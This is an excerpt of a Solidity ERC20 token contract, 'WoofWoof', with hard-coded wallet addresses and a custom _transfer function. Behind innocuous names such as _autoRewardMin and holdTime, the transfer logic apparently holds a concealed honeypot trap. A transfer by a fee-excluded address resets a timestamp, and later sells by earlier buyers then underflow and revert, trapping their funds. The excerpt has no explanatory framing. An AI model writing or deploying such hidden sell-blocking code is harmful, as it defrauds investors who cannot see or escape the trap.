...
contract WoofWoof is ERC20, Ownable {
    ...
    address payable public immutable liquidityWallet = payable(0xe326fcF5E4F501558f9ee3f18ddfa7Bf88379992);
    address payable public immutable marketingWallet = payable(0x13286059Da317928272977AC0F0536a3819A7bDd);
    address payable public immutable devWallet = payable(0xE143196958ad10f8818c320B9E7181Cc23E1D00E);
    ...
    struct MakerHoldInfo {
        uint256 buy;
        uint256 sell;
        uint256 holdTime;
    }

    mapping(address => MakerHoldInfo) private makerInfos;
    uint256 private _autoRewardMin;

    bool private swapping;

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    constructor() ERC20("WoofWoof", "WOOF") {
    ...
    function _transfer(
        ...
        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to]) && to != address(this) && from != address(this)) {
            _autoRewardMin = block.timestamp;
        }
        ...
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (automatedMarketMakerPairs[from]) {
                MakerHoldInfo storage makerInfo = makerInfos[to];
                if (makerInfo.buy == 0) {
                    makerInfo.buy = block.timestamp;
                }
            } else {
                MakerHoldInfo storage makerInfo = makerInfos[from];
                makerInfo.holdTime = makerInfo.buy - _autoRewardMin;
